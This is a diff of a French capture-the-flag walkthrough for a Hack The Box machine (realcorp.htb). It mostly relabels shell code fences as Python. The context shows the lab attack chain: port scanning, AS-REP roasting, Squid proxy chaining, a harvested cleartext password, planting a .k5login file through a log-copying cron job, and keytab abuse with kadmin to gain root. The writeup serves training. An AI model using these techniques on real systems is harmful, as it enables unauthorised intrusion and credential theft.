@@ -12,7 +12,7 @@ Bonjour à tous aujourd'hui je vous présente un walkthrough sur une machine dif
 
 Tout d'abord, faisons un scan TCP + UDP des 65535 ports avec l'outil [masscan](https://github.com/robertdavidgraham/masscan) pour plus de rapidité :
 
-```sh
+```py
 ❯ sudo masscan 10.10.10.224 -p1-65535,U:1-65535 --rate=500 -e tun0 
 
 Discovered open port 88/tcp on 10.10.10.224                                    
@@ -24,7 +24,7 @@ Discovered open port 53/tcp on 10.10.10.224
 
 Ensuite, enregistrons la sortie dans un fichier nommé masscan et faisons un scan plus avancé avec des NSE sur les ports ouverts :
 
-```sh
+```py
 ❯ export ports=$(cat masscan | awk '{print $4}' | grep -o '[0-9]\+' | tr '\n' ',') && echo $ports
 88,22,3128,53,53
 ❯ nmap -p $ports -sCV -oN nmap 10.10.10.224 -Pn
@@ -61,7 +61,7 @@ En tentant d'accéder au proxy nous découvrons un utilisateur : `j.nakazawa`, u
 
 Cette utilisateur est AS-REP Roastable, nous pouvons donc récupérer son ticket Kerberos à partir du KDC mais le hash Kerberos 5 AS-REP etype 23 est incassable :
 
-```sh
+```py
 ❯ GetNPUsers.py -dc-ip 10.10.10.224 -no-pass realcorp.htb/j.nakazawa
 
 [*] Getting TGT for j.nakazawa
@@ -72,7 +72,7 @@ $krb5asrep$18$j.nakazawa@REALCORP.HTB:19231d6324028ef033447c744cecff89$3820ac18d
 
 Pour automatiser notre énumération je vais utiliser [DNSEnum](https://eromang.zataz.com/2009/06/04/dnsenum-informations-noms-domaine/) :
 
-```sh
+```py
 ❯ dnsenum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --dnsserver 10.10.10.224 realcorp.htb
 
 -----   realcorp.htb   -----
@@ -102,21 +102,21 @@ Proxychains va prendre en compte les proxies de haut en bas, deplus il y a plusi
 - **Dynamic chaining**, proxychains va d'abord détecter si le proxy est up avant de l'utiliser
 - **Random chaining**, tout est dans le nom, il va pas suivre un ordre précis
 
+10.197.243.77 accepte seulement les requêtes venant du localhost c'est pour cela que nous devons passer par plusieurs proxies car la configuration directive `http_access allow localhost` est activé.
+
 Dans notre cas, nous allons devoir ajouter cette liste de proxies à l'intérieur du fichier de configuration de proxychains4 `/etc/proxychains4.conf` :
 
-```
+```py
 http  10.10.10.224 3128
 http  127.0.0.1 3128
 http  10.197.243.77 3128
 ```
 
-10.197.243.77 accepte seulement les requêtes venant du localhost c'est pour cela que nous devons passer par plusieurs proxies.
-
 ## Enumeration subdomains
 
 ### Nmap 10.197.243.77
 
-```sh
+```py
 ❯ proxychains4 -f /etc/proxychains4.conf nmap -sT 10.197.243.77 -Pn
 
 PORT     STATE SERVICE
@@ -130,7 +130,7 @@ PORT     STATE SERVICE
 
 ### Nmap 10.197.243.31
 
-```sh
+```py
 ❯ proxychains4 -f /etc/proxychains4.conf nmap -sT 10.197.243.31 -Pn
 
 PORT     STATE SERVICE
@@ -157,7 +157,7 @@ Après m'être renseigné sur [wpad](http://eole.ac-dijon.fr/documentations/2.4/
 
 Cependant cette machine ne répond pas. Nous supposons que ceci est un indice pour trouver une nouvelle machine... Scannons une plage d'IP :
 
-```sh
+```py
 ❯ proxychains4 -f /etc/proxychains4.conf nmap 10.241.251.0/24 -vvv -sT -Pn
 
 <...>
@@ -173,7 +173,7 @@ Nous avons trouvé un serveur SMTP sur la machine 10.241.251.113.
 
 Avec du **banner grabbing** nous pouvous identifier la version du service en marche sur le serveur distant rapidement :
 
-```sh
+```py
 ❯ proxychains4 -f /etc/proxychains4.conf nc 10.241.251.113 25
 
 [proxychains] Dynamic chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
@@ -261,7 +261,7 @@ Nous avons enfin un foothold sur la machine et nous sommes même root du serveur
 
 Une énumération rapide est suffisante pour trouver des credentials dans un fichier de configuration nommé [.msmtprc](https://doc.ubuntu-fr.org/msmtp) à l'intérieur du répertoire personnel de j.nakazawa : 
 
-```sh
+```py
 root@smtp:/home/j.nakazawa# grep 'user\|password' .msmtprc
 user           j.nakazawa
 password       sJB}RM>6Z~64_
@@ -284,7 +284,7 @@ Nous avons besoin d'un client [Kerberos](https://guide.ubuntu-fr.org/server/kerb
 
 Tout d'abord, je vais changer le realm par défaut dans `/etc/krb5.conf` ainsi que le KDC avec la bonne IP, on obtient donc :
 
-```sh
+```py
 default_realm = REALCORP.HTB
 
 REALCORP.HTB = {
@@ -294,7 +294,7 @@ REALCORP.HTB = {
 
 Ensuite, je génére un ticket avec [kinit](https://directory.apache.org/apacheds/kerberos-ug/4.1-authenticate-kinit.html) :
 
-```sh
+```py
 ❯ kinit j.nakazawa
 
 Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
@@ -302,7 +302,7 @@ Password for j.nakazawa@REALCORP.HTB: sJB}RM>6Z~64_
 
 Sachez que nous pouvons lister les tickets crées avec la commande klist :
 
-```sh
+```py
 ❯ klist
 
 Ticket cache: FILE:/tmp/krb5cc_1001
@@ -322,7 +322,7 @@ Nous sommes enfin connecté en tant que j.nakazawa et on peut afficher le flag u
 
 Nous avons un cron appartenant au groupe admin inhabituel : 
 
-```sh
+```py
 [j.nakazawa@srv01 ~]$ cat /etc/crontab
 
 SHELL=/bin/bash
@@ -360,13 +360,13 @@ Si `pam_krb5` est appelé en phase d'autorisation, il vérifie s'il ~/.k5login e
 
 Nous devons alors créer un fichier .k5login dans le répertoire personnel de j.nakazawa :
 
-```sh
+```py
 [j.nakazawa@srv01 ~]$ echo 'j.nakazawa@REALCORP.HTB' > .k5login
 ```
 
 Ainsi que dans le répertoire de admin, pour cela nous devons copier notre .k5login dans les logs Squid :
 
-```sh
+```py
 [j.nakazawa@srv01 ~]$ cp .k5login /var/log/squid/
 ```
 
@@ -380,7 +380,7 @@ Nous sommes maintenant admin du domaine srv01 ! 🥳
 
 Avec [LinEnum](https://github.com/rebootuser/LinEnum) / [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) ou à la main, nous pouvons trouver un fichier [keytab](https://docs.oracle.com/cd/E24843_01/html/E23285/aadmin-10.html) intéréssant appartenant au groupe admin situé au path `/etc/krb5.keytab` : 
 
-```sh
+```py
 [admin@srv01 ~]$ find / \( -path /sys -o -path /proc -o -path /run \) -prune -false -o -group admin 2>/dev/null
 
 /etc/krb5.keytab
@@ -398,7 +398,7 @@ On peut utiliser un fichier keytab pour nous authentifier auprès d'un serveur d
 
 Nous pouvons lire un fichier keytab avec [klist](https://docs.bmc.com/docs/ServerAutomation/85/configuring-after-installation/administering-security/implementing-authentication/implementing-active-directory-kerberos-authentication/configuring-an-authentication-service-for-ad-kerberos-authentication/creating-the-blappserv_login-conf-file-ad-kerberos/using-klist-to-read-the-keytab-file) :
 
-```sh
+```py
 [admin@srv01 ~]$ klist -t -k /etc/krb5.keytab
 
 Keytab name: FILE:/etc/krb5.keytab
@@ -423,7 +423,7 @@ KVNO Timestamp           Principal
 
 Nous allons utiliser [kadmin](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html#kadmin-1) pour [ajouter un principal root](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html#kadmin-1) de service Kerberos dans notre fichier keytab :
 
-```sh
+```py
 [admin@srv01 ~]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
 
 Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
